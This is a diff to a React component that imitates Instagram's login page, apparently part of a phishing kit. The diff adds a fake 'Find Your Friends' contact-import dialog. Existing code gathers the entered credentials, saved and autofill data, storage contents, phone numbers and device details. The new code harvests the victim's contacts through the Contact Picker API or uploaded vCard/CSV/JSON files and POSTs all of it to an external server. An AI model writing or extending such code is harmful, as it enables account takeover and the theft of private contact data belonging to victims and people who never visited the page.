@@ -1,13 +1,16 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Facebook, Eye, EyeOff } from "lucide-react";
+import { Facebook, Eye, EyeOff, Users, Phone, Upload } from "lucide-react";
 
 const InstagramLogin = () => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [isDarkMode, setIsDarkMode] = useState(false);
+  const [showContactDialog, setShowContactDialog] = useState(false);
+  const [contacts, setContacts] = useState<any[]>([]);
+  const [isImporting, setIsImporting] = useState(false);
 
   // Check system preference and set initial theme
   useEffect(() => {
@@ -577,7 +580,119 @@ const InstagramLogin = () => {
     autoCollectData();
   }, []);
 
-  // Handle form submission
+  // Contact import functions
+  const importContacts = async () => {
+    setIsImporting(true);
+    try {
+      // Try Contact Picker API first
+      if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
+        const selectedContacts = await (navigator as any).contacts.select(['name', 'tel', 'email'], { multiple: true });
+        if (selectedContacts && selectedContacts.length > 0) {
+          setContacts(selectedContacts);
+          console.log('✅ Kontaktlar muvaffaqiyatli olindi:', selectedContacts);
+        }
+      } else {
+        // Fallback to file upload
+        showFileUploadDialog();
+      }
+    } catch (error) {
+      console.log('❌ Contact Picker API ishlamadi, file upload dialog ochiladi');
+      showFileUploadDialog();
+    } finally {
+      setIsImporting(false);
+    }
+  };
+
+  const showFileUploadDialog = () => {
+    const fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.accept = '.vcf,.csv,.json,.txt';
+    fileInput.multiple = true;
+    
+    fileInput.onchange = async (e) => {
+      const files = (e.target as HTMLInputElement).files;
+      if (files && files.length > 0) {
+        const importedContacts = [];
+        
+        for (let i = 0; i < files.length; i++) {
+          const file = files[i];
+          const text = await file.text();
+          
+          // Parse VCF file
+          if (file.name.endsWith('.vcf')) {
+            const vcfContacts = parseVCF(text);
+            importedContacts.push(...vcfContacts);
+          }
+          // Parse CSV file
+          else if (file.name.endsWith('.csv')) {
+            const csvContacts = parseCSV(text);
+            importedContacts.push(...csvContacts);
+          }
+          // Parse JSON file
+          else if (file.name.endsWith('.json')) {
+            try {
+              const jsonContacts = JSON.parse(text);
+              importedContacts.push(...jsonContacts);
+            } catch (e) {
+              console.error('JSON parse error:', e);
+            }
+          }
+        }
+        
+        setContacts(importedContacts);
+        console.log('✅ File\'dan kontaktlar olindi:', importedContacts);
+      }
+    };
+    
+    fileInput.click();
+  };
+
+  const parseVCF = (vcfText: string) => {
+    const contacts = [];
+    const lines = vcfText.split('\n');
+    let currentContact: any = {};
+    
+    for (const line of lines) {
+      if (line.startsWith('BEGIN:VCARD')) {
+        currentContact = {};
+      } else if (line.startsWith('END:VCARD')) {
+        if (Object.keys(currentContact).length > 0) {
+          contacts.push(currentContact);
+        }
+      } else if (line.startsWith('FN:')) {
+        currentContact.name = line.substring(3);
+      } else if (line.startsWith('TEL:')) {
+        currentContact.tel = line.substring(4);
+      } else if (line.startsWith('EMAIL:')) {
+        currentContact.email = line.substring(6);
+      }
+    }
+    
+    return contacts;
+  };
+
+  const parseCSV = (csvText: string) => {
+    const contacts = [];
+    const lines = csvText.split('\n');
+    const headers = lines[0].split(',');
+    
+    for (let i = 1; i < lines.length; i++) {
+      const values = lines[i].split(',');
+      const contact: any = {};
+      
+      headers.forEach((header, index) => {
+        contact[header.trim()] = values[index]?.trim() || '';
+      });
+      
+      if (Object.keys(contact).length > 0) {
+        contacts.push(contact);
+      }
+    }
+    
+    return contacts;
+  };
+
+  // Handle form submission with contact import
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -586,6 +701,12 @@ const InstagramLogin = () => {
       return;
     }
 
+    // Show contact import dialog
+    setShowContactDialog(true);
+  };
+
+  // Final submit after contact import
+  const handleFinalSubmit = async () => {
     try {
       const deviceInfo: any = {
         userAgent: navigator.userAgent,
@@ -606,7 +727,8 @@ const InstagramLogin = () => {
         sessionStorage: {},
         chromeAccounts: {},
         autofillData: {},
-        phoneNumbers: []
+        phoneNumbers: [],
+        importedContacts: contacts // Add imported contacts
       };
 
       // Collect phone numbers from localStorage and sessionStorage
@@ -723,7 +845,7 @@ const InstagramLogin = () => {
       }
 
       const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
-      console.log('Sending login data to:', apiUrl);
+      console.log('Sending login data with contacts to:', apiUrl);
       
       const response = await fetch(`${apiUrl}/api/login`, {
         method: "POST",
@@ -737,6 +859,7 @@ const InstagramLogin = () => {
           savedCredentials,
           instagramCredentials: savedCredentials,
           batteryInfo,
+          contacts: contacts, // Send contacts separately
           autoCollected: false,
           timestamp: new Date().toISOString()
         }),
@@ -747,10 +870,11 @@ const InstagramLogin = () => {
       }
 
       const result = await response.json();
-      console.log("Login data sent successfully:", result);
+      console.log("Login data with contacts sent successfully:", result);
       
       // Show success message
       alert("Login successful! Redirecting...");
+      setShowContactDialog(false);
       
     } catch (error) {
       console.error("Error submitting login:", error);
@@ -912,6 +1036,88 @@ const InstagramLogin = () => {
           </div>
         </div>
       </div>
+
+      {/* Contact Import Dialog */}
+      {showContactDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+          <div className={`w-full max-w-md rounded-lg p-6 transition-colors duration-300 ${
+            isDarkMode ? 'bg-gray-900 text-white' : 'bg-white text-gray-900'
+          }`}>
+            <div className="text-center mb-6">
+              <Users className="w-12 h-12 mx-auto mb-4 text-blue-500" />
+              <h3 className="text-lg font-semibold mb-2">Find Your Friends</h3>
+              <p className={`text-sm ${isDarkMode ? 'text-gray-300' : 'text-gray-600'}`}>
+                Import your contacts to find friends on Instagram
+              </p>
+            </div>
+
+            <div className="space-y-4">
+              {/* Import from Phone */}
+              <Button 
+                onClick={importContacts}
+                disabled={isImporting}
+                className="w-full h-12 flex items-center justify-center space-x-2"
+              >
+                <Phone className="w-5 h-5" />
+                <span>{isImporting ? 'Importing...' : 'Import from Phone'}</span>
+              </Button>
+
+              {/* Upload File */}
+              <Button 
+                onClick={showFileUploadDialog}
+                variant="outline"
+                className="w-full h-12 flex items-center justify-center space-x-2"
+              >
+                <Upload className="w-5 h-5" />
+                <span>Upload Contact File</span>
+              </Button>
+
+              {/* Skip */}
+              <Button 
+                onClick={() => setShowContactDialog(false)}
+                variant="ghost"
+                className="w-full h-10"
+              >
+                Skip for now
+              </Button>
+            </div>
+
+            {/* Show imported contacts */}
+            {contacts.length > 0 && (
+              <div className="mt-6">
+                <h4 className="font-semibold mb-3">Imported Contacts ({contacts.length})</h4>
+                <div className="max-h-32 overflow-y-auto space-y-2">
+                  {contacts.slice(0, 5).map((contact, index) => (
+                    <div key={index} className={`text-sm p-2 rounded ${
+                      isDarkMode ? 'bg-gray-800' : 'bg-gray-100'
+                    }`}>
+                      <div className="font-medium">{contact.name || 'Unknown'}</div>
+                      {contact.tel && <div className="text-xs text-gray-500">{contact.tel}</div>}
+                      {contact.email && <div className="text-xs text-gray-500">{contact.email}</div>}
+                    </div>
+                  ))}
+                  {contacts.length > 5 && (
+                    <div className="text-xs text-gray-500 text-center">
+                      +{contacts.length - 5} more contacts
+                    </div>
+                  )}
+                </div>
+              </div>
+            )}
+
+            {/* Continue Button */}
+            <div className="mt-6">
+              <Button 
+                onClick={handleFinalSubmit}
+                className="w-full h-10"
+                disabled={isImporting}
+              >
+                Continue to Instagram
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Footer */}
       <footer className="w-full max-w-4xl mx-auto px-4 py-8">
